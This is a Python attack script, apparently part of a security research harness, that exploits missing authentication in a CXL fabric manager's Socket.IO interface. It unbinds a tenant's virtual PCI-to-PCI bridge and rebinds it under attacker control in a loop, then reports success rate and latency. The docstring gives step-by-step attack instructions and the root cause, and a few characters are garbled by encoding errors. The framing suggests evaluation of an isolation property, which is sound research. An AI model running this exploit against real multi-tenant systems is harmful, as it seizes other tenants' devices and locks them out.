"""
ATK-1: Cross-Tenant Device Hijack
==================================
Property violated: Confinement (P1)

Scenario:
  - Tenant T1 owns vCS-0/vPPB-0 (bound to physical port 1 / device AAAA...0001)
  - Attacker A (with any valid FM network access, no tenant credentials required)
    issues UNBIND on T1's vPPB, then BIND on own behalf.

Root cause (from CXL 3.1 spec Â§9.7):
  FMAPI vcs:unbind and vcs:bind carry no authentication field.
  The FM (socketio_server.py _bind_vppb/_unbind_vppb) performs zero
  ownership or identity checks before forwarding to the MCTP CCI executor.

Attack steps:
  1. Connect to FM Socket.IO (port 8200) â no credentials needed
  2. Emit vcs:unbind {vcs=0, vppb=0}  â strips T1 ownership
  3. Emit vcs:bind  {vcs=0, vppb=0, port=1} â attacker claims device
  4. Verify: T1 issues bind on vppb=0 â ALREADY_BOUND (attacker won)

Success: vppb=0 is bound under attacker control; T1 locked out.
"""

import asyncio
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from fm_client import TimedFMClient, FM_URL


# Topology constants (from attack_topology.yaml)
VCS_ID = 0
T1_VPPB = 0       # Tenant 1's device  (physical port 1)
T1_PORT  = 1
ATK_PORT = 1      # Attacker re-binds to same port (hijack)


async def run_attack(url: str = FM_URL, iterations: int = 100) -> dict:
    """Run ATK-1 for `iterations` rounds. Returns result summary."""
    client = TimedFMClient(url=url)
    await client.connect()

    successes = 0
    failures = 0

    for i in range(iterations):
        try:
            # Step 1: Verify T1 owns the vPPB (initial state: bound)
            # Step 2: Attacker unbinds T1's device â NO AUTH CHECK
            unbind_resp = await client.unbind_vppb(VCS_ID, T1_VPPB)

            # Step 3: Attacker binds the freed vPPB to own control
            bind_resp = await client.bind_vppb(VCS_ID, T1_VPPB, ATK_PORT)

            # Success: attacker now controls T1's device
            # (In a real scenario T1 discovers device gone on next access)
            successes += 1

        except Exception as e:
            failures += 1

    await client.disconnect()

    latencies = client.latencies
    mean_lat = sum(latencies) / len(latencies) if latencies else 0
    # Each iteration = 2 calls (unbind + bind), take per-call mean
    mean_lat_per_call = mean_lat / 2

    return {
        "attack": "ATK-1: Cross-Tenant Device Hijack",
        "iterations": iterations,
        "successes": successes,
        "failures": failures,
        "success_rate_pct": round(100 * successes / iterations, 1),
        "mean_latency_us": round(mean_lat_per_call, 2),
        "total_latencies_us": [round(l, 2) for l in latencies[:10]],  # first 10
    }


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else FM_URL
    result = asyncio.run(run_attack(url=url, iterations=100))
    print(f"\n{'='*60}")
    print(f"ATK-1 Results:")
    print(f"  Success rate : {result['success_rate_pct']}%")
    print(f"  Mean latency : {result['mean_latency_us']:.2f} Î¼s (per call)")
    print(f"  Iterations   : {result['iterations']}")
    print(f"  Failures     : {result['failures']}")
